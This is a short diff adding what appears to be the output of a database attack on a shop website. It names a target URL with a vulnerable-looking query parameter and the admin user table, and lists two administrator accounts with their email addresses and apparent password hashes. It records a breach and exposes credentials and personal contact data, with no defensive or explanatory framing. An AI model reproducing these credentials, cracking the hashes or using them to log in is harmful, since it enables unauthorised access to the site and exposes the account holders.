@@ -1,0 +1,7 @@
+ Target : http://shop.nanowin.com.cn/buy_goods.php?cat_id=1
+ 
+ Tables : ecs_admin_user
+ 
+ user_name   email                  password
+ admin	     sales@nanowin.com.cn	  b7cc7c2629a6620c279b4334d44e2e66
+ caiwu	     caiwu@sina.com	        e0507b8d4bc2d97c01defa9d770251f5
